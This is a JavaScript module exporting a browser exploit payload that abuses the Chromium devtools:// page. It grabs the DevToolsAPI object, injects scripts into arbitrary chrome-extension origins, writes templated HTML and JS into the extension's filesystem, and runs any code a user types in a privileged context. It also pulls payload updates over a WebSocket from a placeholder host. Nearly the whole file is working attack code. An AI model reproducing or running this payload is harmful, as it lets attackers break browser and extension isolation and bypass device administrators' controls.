function payload1() {
    if (!opener) {
        opener = window;
    }
    // alert(origin);

    //     window.w = w;
    // })
    const w = window.opener.open("devtools://devtools/bundled/devtools_app.html");
    window.opener.close();
    w.addEventListener("load", async () => {
        if (!w.DevToolsAPI) {
            console.log("reloading");
            w.opener = null;
            w.location.reload();
        }
        await sleep(500);
        console.log("Got DevToolsAPI object from opened window:", w.DevToolsAPI);
        exploit(w);
    });

    window.w = w;


    function exploit(w) {


        function ui() {
            var globalUID = 0;
            let globalMap = [];
            function payload_swamp(w, d) {
                // console.log(d);
                // w.setTimeout(function() {
                const blob_url = new Blob(["alert(1)"], { type: "text/html" });

                w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, function(fs) {
                    fs.root.getFile('index.js', { create: true }, function(entry) {
                        entry.remove('index.js', function() {
                            fs.root.getFile('index.js', { create: true }, function(entry) {
                                entry.createWriter(function(writer) {
                                    writer.write(new Blob([`%%EXTJS%%`]))
                                })
                            })
                        })
                    })
                    fs.root.getFile('index.html', { create: true }, function(entry) {
                        console.log('hi');
                        entry.remove(function() {
                            console.log('hi');

                            fs.root.getFile('index.html', { create: true }, function(entry) {
                                entry.createWriter(function(writer) {
                                    writer.write(new Blob([`%%EXTHTML%%<script src=\"index.js\"></script>`]));
                                    w.chrome.tabs.create({ url: entry.toURL() })
                                })

                            })
                        }
                        )
                    })
                })


                // }, 5000);

            }

            document.open();
            document.write(`
                <style>
                    iframe {
                        opacity: 0;
                        width: 0;
                        height: 0;
                    }
                </style>
                <p> Press q for evaluating code under <a id="extdbg" href="javascript:void(0)"> extension id</a> </p>
                <p> Press m for evaluating under <a id="devdbg" href="javascript:void(0)">devtools</a> context </p>
                <p> Typing 'cancel' in any prompt will cancel the current operation. </p>
                <a href="devtools://devtools/bundled/devtools_app.html?experiments=true&ws=%%updaterurl%%">Re-open devtools</a>
                <a href="javascript:void(0)" id="updater">Update payload</a>
            `)
            document.close();
            document.title = "Dashboard";
            document.querySelector('#updater').onclick = function(ev) {
                const ws = new WebSocket("ws://%%updaterurl%%");

                ws.onopen = function() {
                    ws.onmessage = function(ev) {
                        const received = JSON.parse(ev.data);
                        const savedURL = received.params.request.url;
                        ws.close();
                        const w = open('', '_blank');
                        console.log(savedURL);
                        w.eval(`setTimeout(function () {opener.open(atob("${btoa(savedURL)}"), '_blank')}, 500);`);
                        setTimeout(() => { location.reload() });
                    }
                    ws.send(JSON.stringify({
                        method: "Target.setDiscoverTargets",
                        id: 999,
                        params: {}
                    }));
                }

            }
            onmessage = function(d) {
                if (!globalMap[d.data.uid]) return;

                for (const frame of globalMap) {
                    if (!frame) continue;
                    if (frame.idx === d.data.uid) {
                        frame.remove();
                        delete globalMap[globalMap.indexOf(frame)];
                        return;
                    }
                }
            }
            document.querySelector('#extdbg').onclick = function() {
                let x = null;
                while (!x) {
                    x = prompt('Extension id?');
                    if (x === "cancel") {
                        return;
                    }
                }
                const URL_1 = `chrome-extension://${x ??
                    alert("NOTREACHED")}/manifest.json`;
                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/manifest.json'); w.onload = function () {(${payload_swamp.toString()})(w, data.data)} }//`);
                const ifr = document.createElement("iframe");
                ifr.src = URL_1;
                document.body.appendChild(ifr);
                const ifrid = globalMap.push(ifr) - 1;
                ifr.idx = ifrid;
                ifr.onload = function() {

                    ifr.contentWindow.postMessage({
                        type: "uidpass", passcode:
                            ifrid
                    }, '*');
                    // console.log('hi');
                }

            }
            document.querySelector('#devdbg').onclick = function() {
                var l_canceled = false;
                const id = setTimeout(function m() {
                    if (l_canceled) return;
                    (new Function(prompt("Evaluate script! (type 'cancel' to cancel)")))();
                    if (!l_canceled) setTimeout(m, 0);
                    clearTimeout(id);
                });
                Object.defineProperty(window, 'cancel', {
                    get: function() {
                        l_canceled = true;
                    }, configurable: true
                })
                return;
            }
            console.log(globalMap);
        }
        w.eval(`(${ui.toString()})()`);
        window.close();

    }

    function sleep(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }
}
export { payload1 }